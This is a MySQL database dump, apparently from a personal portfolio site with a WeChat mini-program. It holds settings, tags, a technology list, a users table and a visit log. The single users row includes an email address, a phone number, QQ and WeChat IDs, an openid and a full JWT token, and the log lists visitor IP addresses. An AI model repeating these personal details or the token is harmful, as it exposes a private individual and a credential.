INSERT INTO `system_settings` VALUES (14, 'backup_retention', '30', 'int', '备份保留天数', 'backup', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (15, 'backup_path', '/backups/', 'string', '备份路径', 'backup', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (16, 'system_version', '1.0.0', 'string', '系统版本', 'system', 1, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (17, 'maintenance_mode', '0', 'bool', '维护模式', 'system', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (18, 'debug_mode', '0', 'bool', '调试模式', 'system', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');

-- ----------------------------
-- Table structure for tag
-- ----------------------------
DROP TABLE IF EXISTS `tag`;
CREATE TABLE `tag`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '标签名称',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `uk_name`(`name`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '标签表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of tag
-- ----------------------------
INSERT INTO `tag` VALUES (1, 'Vue3', '2025-08-17 17:48:10');
INSERT INTO `tag` VALUES (2, 'Web开发', '2025-08-17 17:48:10');
INSERT INTO `tag` VALUES (3, '响应式', '2025-08-17 17:48:10');
INSERT INTO `tag` VALUES (4, '数据分析', '2025-08-17 17:48:10');
INSERT INTO `tag` VALUES (5, '大数据', '2025-08-17 17:48:10');
INSERT INTO `tag` VALUES (6, '可视化', '2025-08-17 17:48:10');
INSERT INTO `tag` VALUES (7, 'React', '2025-08-17 17:48:10');
INSERT INTO `tag` VALUES (8, 'Node.js', '2025-08-17 17:48:10');
INSERT INTO `tag` VALUES (9, 'Python', '2025-08-17 17:48:10');
INSERT INTO `tag` VALUES (10, 'PHP', '2025-08-17 17:48:10');

-- ----------------------------
-- Table structure for technology
-- ----------------------------
DROP TABLE IF EXISTS `technology`;
CREATE TABLE `technology`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '技术名称',
  `img` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `sort_order` int(11) NULL DEFAULT NULL,
  `status` int(11) NULL DEFAULT NULL,
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `uk_name`(`name`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 22 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '技术栈表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of technology
-- ----------------------------
INSERT INTO `technology` VALUES (1, 'HTML', '/static/images/exp/html.png', 1, 1, '2025-09-01 19:07:53', NULL);
INSERT INTO `technology` VALUES (2, 'PHP', '/static/images/exp/php.png', 1, 1, '2025-09-01 19:08:13', NULL);
INSERT INTO `technology` VALUES (3, 'VUE', '/static/images/exp/vue.png', 1, 1, '2025-09-01 19:08:26', NULL);
INSERT INTO `technology` VALUES (4, 'Java', '/static/images/exp/java.png', 1, 1, '2025-09-01 19:08:41', NULL);
INSERT INTO `technology` VALUES (5, 'Python', '/static/images/exp/python.png', 1, 1, '2025-09-01 19:08:57', NULL);
INSERT INTO `technology` VALUES (6, 'ThinkPHP', '/static/images/exp/thinkphp.png', 1, 1, '2025-09-01 19:09:15', NULL);
INSERT INTO `technology` VALUES (7, 'Laravel', '/static/images/exp/laravel.png', 1, 1, '2025-09-01 19:09:26', NULL);
INSERT INTO `technology` VALUES (8, 'BootStrap', '/static/images/exp/bootstrap.png', 1, 1, '2025-09-01 19:09:38', NULL);
INSERT INTO `technology` VALUES (9, 'Webpack', '/static/images/exp/webpack.png', 1, 1, '2025-09-01 19:09:51', NULL);
INSERT INTO `technology` VALUES (10, 'Vite', '/static/images/exp/vite.png', 1, 1, '2025-09-01 19:10:03', NULL);
INSERT INTO `technology` VALUES (11, 'FastAdmin', '/static/images/exp/fastadmin.png', 1, 1, '2025-09-01 19:10:16', NULL);
INSERT INTO `technology` VALUES (12, 'Uniapp', '/static/images/exp/uniapp.png', 1, 1, '2025-09-01 19:10:30', NULL);
INSERT INTO `technology` VALUES (13, 'Flutter', '/static/images/exp/flutter.png', 1, 1, '2025-09-01 19:10:41', NULL);
INSERT INTO `technology` VALUES (14, 'PyCharm', '/static/images/exp/pycharm.png', 1, 1, '2025-09-01 19:10:52', NULL);
INSERT INTO `technology` VALUES (15, 'PS', '/static/images/exp/ps.png', 1, 1, '2025-09-01 19:11:05', NULL);
INSERT INTO `technology` VALUES (16, 'PR', '/static/images/exp/pr.png', 1, 1, '2025-09-01 19:11:18', NULL);
INSERT INTO `technology` VALUES (17, 'AI', '/static/images/exp/ai.png', 1, 1, '2025-09-01 19:11:28', NULL);
INSERT INTO `technology` VALUES (18, 'C4D', '/static/images/exp/c4d.png', 1, 1, '2025-09-01 19:11:42', NULL);
INSERT INTO `technology` VALUES (19, 'Figma', '/static/images/exp/figma.png', 1, 1, '2025-09-01 19:11:55', NULL);
INSERT INTO `technology` VALUES (20, 'Sketch', '/static/images/exp/sketch.png', 1, 1, '2025-09-01 19:12:06', NULL);
INSERT INTO `technology` VALUES (21, 'FastAPI', '/static/images/exp/fastapi.png', 1, 1, '2025-09-01 19:12:17', NULL);

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `openid` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '微信openid',
  `user_key` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '用户唯一标识',
  `nickname` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '用户昵称',
  `avatar` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '头像URL',
  `gender` tinyint(1) NULL DEFAULT 0 COMMENT '性别：0未知，1男，2女',
  `country` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '国家',
  `province` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '省份',
  `city` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '城市',
  `language` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT 'zh_CN' COMMENT '语言',
  `visit_count` int(11) NULL DEFAULT 0 COMMENT '访问次数',
  `like_count` int(11) NULL DEFAULT 0 COMMENT '点赞次数',
  `token` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'JWT token',
  `token_expire_time` datetime NULL DEFAULT NULL COMMENT 'token过期时间',
  `is_new_user` tinyint(1) NULL DEFAULT 0 COMMENT '是否新用户',
  `is_engineer` tinyint(1) NULL DEFAULT 0 COMMENT '是否工程师',
  `user_type` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT 'wechat' COMMENT '用户类型：wechat',
  `status` tinyint(1) NULL DEFAULT 1 COMMENT '状态：1启用，0禁用',
  `role` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '访客' COMMENT '角色',
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '邮箱',
  `phone` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '手机号',
  `qq` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'QQ号',
  `wechat` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '微信号',
  `github` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'GitHub地址',
  `web_url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '个人网站',
  `working_hours` json NULL COMMENT '工作时间',
  `last_login_time` datetime NULL DEFAULT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '最后登录IP',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `uk_user_key`(`user_key`) USING BTREE,
  UNIQUE INDEX `uk_openid`(`openid`) USING BTREE,
  INDEX `idx_nickname`(`nickname`) USING BTREE,
  INDEX `idx_user_type`(`user_type`) USING BTREE,
  INDEX `idx_status`(`status`) USING BTREE,
  INDEX `idx_create_time`(`create_time`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '统一用户表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of users
-- ----------------------------
INSERT INTO `users` VALUES (1, 'ocAWa4jVUL8Lp9eiqkRbMjYkjq28', 'e2d2eb129b794b0a45b39881aa8161e3', 'PeterSun', 'https://www.sundongliang.cn/static/images/avatar/avatar_68b5f58277900.jpg', 0, '', '', '', 'zh_CN', 0, 0, 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NTY4MzQ0NTcsImV4cCI6MTc1NzQzOTI1NywibmJmIjoxNzU2ODM0NDU3LCJ1c2VyX2lkIjoxLCJ0eXBlIjoid2VjaGF0X3VzZXIifQ.sqMlwYP7nxL2VKkCEuXK_qEsyIbK2OY1Tcl3xi_G9TY', '2025-09-10 01:34:17', 0, 0, 'admin', 1, '访客', 'cto@cvun.net', '15993113751', '21312314', 'cto-peter', '', '', '[{\"day\": \"工作日\", \"time\": \"09:00 - 18:00\"}, {\"day\": \"周六\", \"time\": \"10:00 - 16:00\"}, {\"day\": \"周日\", \"time\": \"休息\"}]', '2025-09-03 01:34:17', '127.0.0.1', '2025-09-02 03:34:25', '2025-09-03 01:34:17');

-- ----------------------------
-- Table structure for visit_log
-- ----------------------------
DROP TABLE IF EXISTS `visit_log`;
CREATE TABLE `visit_log`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` varchar(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'IP地址',
  `page` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '访问页面',
  `referer` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT '来源页面',
  `user_agent` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL COMMENT '用户代理',
  `device_type` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT 'desktop' COMMENT '设备类型：desktop,mobile,tablet',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_ip`(`ip`) USING BTREE,
  INDEX `idx_page`(`page`) USING BTREE,
  INDEX `idx_device`(`device_type`) USING BTREE,
  INDEX `idx_create_time`(`create_time`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 267 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '访问日志表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of visit_log
-- ----------------------------
INSERT INTO `visit_log` VALUES (49, '39.163.100.223', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e36) NetType/WIFI Language/zh_CN', 'mobile', '2025-08-31 04:24:30');
INSERT INTO `visit_log` VALUES (50, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/2', 'mobile', '2025-08-31 15:30:11');
INSERT INTO `visit_log` VALUES (51, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/6', 'mobile', '2025-08-31 15:37:32');
INSERT INTO `visit_log` VALUES (52, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/7', 'mobile', '2025-08-31 15:42:37');
INSERT INTO `visit_log` VALUES (53, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/10', 'mobile', '2025-08-31 15:47:57');
INSERT INTO `visit_log` VALUES (54, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/13', 'mobile', '2025-08-31 15:53:49');
INSERT INTO `visit_log` VALUES (55, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/15', 'mobile', '2025-08-31 16:01:22');
INSERT INTO `visit_log` VALUES (56, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/19', 'mobile', '2025-08-31 16:12:42');
INSERT INTO `visit_log` VALUES (57, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/23', 'mobile', '2025-08-31 16:17:57');
INSERT INTO `visit_log` VALUES (58, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/24', 'mobile', '2025-08-31 16:23:34');
INSERT INTO `visit_log` VALUES (59, '39.163.100.240', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/26', 'mobile', '2025-08-31 16:32:49');
INSERT INTO `visit_log` VALUES (60, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/1', 'mobile', '2025-09-01 12:26:39');
INSERT INTO `visit_log` VALUES (61, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/2', 'mobile', '2025-09-01 12:32:22');
INSERT INTO `visit_log` VALUES (62, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/7', 'mobile', '2025-09-01 12:38:32');
INSERT INTO `visit_log` VALUES (63, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/9', 'mobile', '2025-09-01 12:46:58');
INSERT INTO `visit_log` VALUES (64, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/11', 'mobile', '2025-09-01 12:54:13');
INSERT INTO `visit_log` VALUES (65, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/14', 'mobile', '2025-09-01 13:01:07');
INSERT INTO `visit_log` VALUES (66, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/18', 'mobile', '2025-09-01 13:06:08');
INSERT INTO `visit_log` VALUES (67, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/21', 'mobile', '2025-09-01 13:15:36');
INSERT INTO `visit_log` VALUES (68, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/26', 'mobile', '2025-09-01 13:21:20');
INSERT INTO `visit_log` VALUES (69, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/30', 'mobile', '2025-09-01 13:27:00');
INSERT INTO `visit_log` VALUES (70, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/34', 'mobile', '2025-09-01 13:33:43');
INSERT INTO `visit_log` VALUES (71, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/37', 'mobile', '2025-09-01 13:43:21');
INSERT INTO `visit_log` VALUES (72, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/38', 'mobile', '2025-09-01 13:51:00');
INSERT INTO `visit_log` VALUES (73, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/42', 'mobile', '2025-09-01 13:59:20');
INSERT INTO `visit_log` VALUES (74, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/44', 'mobile', '2025-09-01 14:14:49');
INSERT INTO `visit_log` VALUES (75, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/44', 'mobile', '2025-09-01 15:05:21');
INSERT INTO `visit_log` VALUES (76, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/47', 'mobile', '2025-09-01 15:18:42');
INSERT INTO `visit_log` VALUES (77, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/52', 'mobile', '2025-09-01 15:32:18');
INSERT INTO `visit_log` VALUES (78, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/53', 'mobile', '2025-09-01 15:46:35');
INSERT INTO `visit_log` VALUES (79, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/56', 'mobile', '2025-09-01 16:00:35');
INSERT INTO `visit_log` VALUES (80, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/63', 'mobile', '2025-09-01 16:11:04');
INSERT INTO `visit_log` VALUES (81, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 16:16:30');
INSERT INTO `visit_log` VALUES (82, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 16:22:47');
INSERT INTO `visit_log` VALUES (83, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 16:32:28');
INSERT INTO `visit_log` VALUES (84, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 16:38:35');
INSERT INTO `visit_log` VALUES (85, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 16:47:31');
INSERT INTO `visit_log` VALUES (86, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 16:54:40');
INSERT INTO `visit_log` VALUES (87, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 17:01:54');
INSERT INTO `visit_log` VALUES (88, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-01 17:04:54');
INSERT INTO `visit_log` VALUES (89, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 17:10:06');
INSERT INTO `visit_log` VALUES (90, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 17:15:40');
INSERT INTO `visit_log` VALUES (91, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 17:20:59');
INSERT INTO `visit_log` VALUES (92, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/78', 'mobile', '2025-09-01 17:26:15');
INSERT INTO `visit_log` VALUES (93, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/84', 'mobile', '2025-09-01 17:31:42');
INSERT INTO `visit_log` VALUES (94, '39.163.100.200', '/pages/contact/contact', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/85', 'mobile', '2025-09-01 17:33:26');
